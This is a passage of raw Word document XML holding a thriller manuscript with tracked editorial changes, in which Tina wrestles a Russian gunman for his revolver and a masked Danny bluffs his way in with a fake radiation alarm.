            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>n</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, she </w:t>
      </w:r>
      <w:del w:id="1195" w:author="TextVet" w:date="2016-03-17T15:32:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00943FB9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>reached for his hand.</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1196" w:author="TextVet" w:date="2016-03-17T15:32:00Z">
        <w:r w:rsidR="00943FB9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>had</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:ins w:id="1197" w:author="TextVet" w:date="2016-03-17T15:32:00Z">
        <w:r w:rsidR="00943FB9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>h</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1198" w:author="TextVet" w:date="2016-03-17T15:32:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00943FB9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>H</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">er palm </w:t>
      </w:r>
      <w:ins w:id="1199" w:author="TextVet" w:date="2016-03-17T15:32:00Z">
        <w:r w:rsidR="00943FB9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>on</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1200" w:author="TextVet" w:date="2016-03-17T15:32:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00943FB9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>made contact with</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> the butt of the revolver. She grabbed it and pushed the barrel upward and away from her. She worked her fingers between his hand and the gun. The vial fell, rolling in a small circle on the linoleum. The revolver twisted in his grasp but wouldn’t yield. Her index finger landed inside the trigger guard.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008500FA" w:rsidRDefault="000D3488" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:ins w:id="1201" w:author="TextVet" w:date="2016-03-17T15:34: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realized that, even if she couldn’t take the gun, maybe she could empty it. Guns only hold so many bullets. And without the threat of being shot, she might be able to make a run for it.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pulled the trigger.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sound was</w:t>
      </w:r>
      <w:del w:id="1202" w:author="TextVet" w:date="2016-03-17T15:34:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00985A1E">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n</w:t>
      </w:r>
      <w:ins w:id="1203" w:author="TextVet" w:date="2016-03-17T15:34:00Z">
        <w:r w:rsidR="00985A1E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>’</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1204" w:author="TextVet" w:date="2016-03-17T15:34:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00985A1E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>o</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>t just deafening</w:t>
      </w:r>
      <w:ins w:id="1205" w:author="TextVet" w:date="2016-03-17T15:34:00Z">
        <w:r w:rsidR="00985A1E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>;</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1206" w:author="TextVet" w:date="2016-03-17T15:34:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00985A1E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">. It was so loud </w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1207" w:author="TextVet" w:date="2016-03-17T15:34:00Z">
        <w:r w:rsidR="00985A1E">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 xml:space="preserve">it was </w:t>
      </w:r>
      <w:r w:rsidR="00566952" w:rsidRPr="00566952">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="1208" w:author="TextVet" w:date="2016-03-17T15:34:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>blinding.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foot-long arc of black</w:t>
      </w:r>
      <w:ins w:id="1209" w:author="TextVet" w:date="2016-03-17T15:35:00Z">
        <w:r w:rsidR="00941875">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>-</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1210" w:author="TextVet" w:date="2016-03-17T15:35:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00941875">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and</w:t>
      </w:r>
      <w:ins w:id="1211" w:author="TextVet" w:date="2016-03-17T15:35:00Z">
        <w:r w:rsidR="00941875">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>-</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1212" w:author="TextVet" w:date="2016-03-17T15:35:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00941875">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orange flame flashed from the barrel. A hot shock wave blasted across Tina’s face</w:t>
      </w:r>
      <w:ins w:id="1213" w:author="TextVet" w:date="2016-03-17T15:35:00Z">
        <w:r w:rsidR="0037114D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>,</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1214" w:author="TextVet" w:date="2016-03-17T15:35:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0037114D">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jostl</w:t>
      </w:r>
      <w:del w:id="1215" w:author="TextVet" w:date="2016-03-17T15:35:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0037114D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>ed</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1216" w:author="TextVet" w:date="2016-03-17T15:35:00Z">
        <w:r w:rsidR="0037114D">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her hair. Her nostrils filled with the sharp, earthy odor of </w:t>
      </w:r>
      <w:commentRangeStart w:id="1217"/>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>gunpowder</w:t>
      </w:r>
      <w:commentRangeEnd w:id="1217"/>
      <w:r w:rsidR="00A94632">
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:commentReference w:id="1217"/>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gun’s recoil hit her palm like a baseball bat in full swing. Her hand was knocked back as the revolver flew upward, escaping her grasp. The Russian, his arms longer and his grip stronger, was just barely able to keep hold of the weapon. Grainy white dust sprinkled from the wall nearby. There was a hole in the drywall, the size of a man’s fist.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For a split second, she was too disoriented to move. The shock of the explosion </w:t>
      </w:r>
      <w:ins w:id="1218" w:author="TextVet" w:date="2016-03-17T15:37:00Z">
        <w:r w:rsidR="00A6194B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">had </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">left her momentarily paralyzed. In that moment, her world was reduced to nothing </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">but the hole in the wall and the ringing in her ears. On an instinctive level, she </w:t>
      </w:r>
      <w:ins w:id="1219" w:author="TextVet" w:date="2016-03-17T15:38:00Z">
        <w:r w:rsidR="003D6E7F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>knew</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1220" w:author="TextVet" w:date="2016-03-17T15:38:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="003D6E7F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>felt like</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> she had to make sure she could at least still breathe before doing anything else.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suddenly she couldn’t.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While she had been dazed by the blast, the Russian had regained control of the weapon. He hadn’t shot her with it. Instead, he</w:t>
      </w:r>
      <w:ins w:id="1221" w:author="TextVet" w:date="2016-03-17T15:39:00Z">
        <w:r w:rsidR="006F796D">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slammed the butt high into her abdomen, just below her sternum.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clutched her chest with both hands, gasping </w:t>
      </w:r>
      <w:del w:id="1222" w:author="TextVet" w:date="2016-03-17T15:40:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="002C0406">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">desperately </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">for air, writhing and twisting her body, unable to understand why her lungs suddenly refused the simple autonomic instruction to </w:t>
      </w:r>
      <w:commentRangeStart w:id="1223"/>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>just</w:t>
      </w:r>
      <w:commentRangeEnd w:id="1223"/>
      <w:r w:rsidR="002C0406">
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:commentReference w:id="1223"/>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>inhale</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. She heaved her shoulders, trying to get a shallow current of oxygen into her quickly acidifying bloodstream. Her clenching throat emitted an unnatural, high-pitched wheeze.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After several terrifying seconds, her breath gradually returned.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“Stupid fucking bitch,” grumbled the Russian, angry but collected. He touched two gloved fingers to his mouth and examined them. His lower lip was bleeding where Tina had busted it open with the keyboard. He slowly knelt down and retrieved the vial from the floor, keeping the gun trained on her with renewed mindfulness. “You try something like that again, I hurt you in ways that take longer to heal. Understand?”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Tina’s mind spun with anger, fear, and self-pity. With nausea welling up in her throat, she began to march toward the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was then that the Russian, with a startled expression, suddenly turned his head toward the hallway. He quickly and quietly motioned with his hand for her to stop moving.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halted in her tracks. “What now?”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="00566952" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00566952">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="1224" w:author="TextVet" w:date="2016-03-17T15:42:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>“Shhhhh!”</w:t>
      </w:r>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:ins w:id="1225" w:author="TextVet" w:date="2016-03-17T15:42:00Z">
        <w:r w:rsidR="00B63512">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>hisse</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1226" w:author="TextVet" w:date="2016-03-17T15:42:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="00B63512">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>sai</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>d the Russian.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could just barely make out a man’s voice from down the hallway, steadily drawing closer.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“Negative, Dispatch,” said the man’s voice. “No signs of engagement. Breach signals are rising. Proceeding further into Sector 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stared at the doorway. “What is this shit?” he mumbled slowly.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“Dispatch, I’m seeing illumination from the cryogenic storage area,” the unseen man said loudly. “Radiometric breach waves are increasing. Approaching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Russian turned to Tina with eyes wide, his expression angrily demanding answers. Tina, just as confused, shrugged with upturned palms. He closed his gloved fist around the tube, and tucked his revolver into his jacket pocket. “Don’t move,” he </w:t>
      </w:r>
      <w:del w:id="1227" w:author="TextVet" w:date="2016-03-17T15:43:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00745A50">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>said to</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1228" w:author="TextVet" w:date="2016-03-17T15:43:00Z">
        <w:r w:rsidR="00745A50">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ordered</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">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then stepped out into the hallway, and</w:t>
      </w:r>
      <w:ins w:id="1229" w:author="TextVet" w:date="2016-03-17T15:44:00Z">
        <w:r w:rsidR="00224D33">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del w:id="1230" w:author="TextVet" w:date="2016-03-17T15:44:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00224D33">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">as he </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>clos</w:t>
      </w:r>
      <w:ins w:id="1231" w:author="TextVet" w:date="2016-03-17T15:44:00Z">
        <w:r w:rsidR="00224D33">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ing</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1232" w:author="TextVet" w:date="2016-03-17T15:44:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00224D33">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the door, he </w:t>
      </w:r>
      <w:commentRangeStart w:id="1233"/>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>said</w:t>
      </w:r>
      <w:commentRangeEnd w:id="1233"/>
      <w:r w:rsidR="00DD4DF5">
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:commentReference w:id="1233"/>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, “Who the fuck are you?”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00F62BCE">
      <w:pPr>
        <w:pStyle w:val="ChapterNum"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:lastRenderedPageBreak/>
        <w:t>12</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Russian looked a lot scarier in person</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> than on a laptop screen. He wasn’t any taller than Danny, but his raw strength was clearly evident in his posture. His busted lip only added to his ferocity.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felt ill. His own body was the logical result of slouching over a keyboard since the age of seven. His idea of exercise was </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Dance Dance Revolution</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. This man could end him without breaking a sweat.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“Sir, you need to accompany me to decontamination immediately,” Danny said authoritatively through a surgical mask that covered his mouth and nose — and also saved him from having to improvise facial expressions. “This facility has been exposed to ectopic levels of radiological contaminatives far in excess of federal safety obligations.”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the fuck are you talking about?” the Russian grumbled.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held his microwave gun pointed at him with one hand and his cellphone up to his ear with the other. Despite </w:t>
      </w:r>
      <w:del w:id="1234" w:author="TextVet" w:date="2016-03-17T15:46:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00D10570">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">the fact that </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>the former</w:t>
      </w:r>
      <w:ins w:id="1235" w:author="TextVet" w:date="2016-03-17T15:46:00Z">
        <w:r w:rsidR="00D10570">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>’s</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1236" w:author="TextVet" w:date="2016-03-17T15:47:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00D10570">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
      <w:del w:id="1237" w:author="TextVet" w:date="2016-03-17T15:46:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00D10570">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>was</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> technically </w:t>
      </w:r>
      <w:ins w:id="1238" w:author="TextVet" w:date="2016-03-17T15:47:00Z">
        <w:r w:rsidR="00D10570">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">being </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
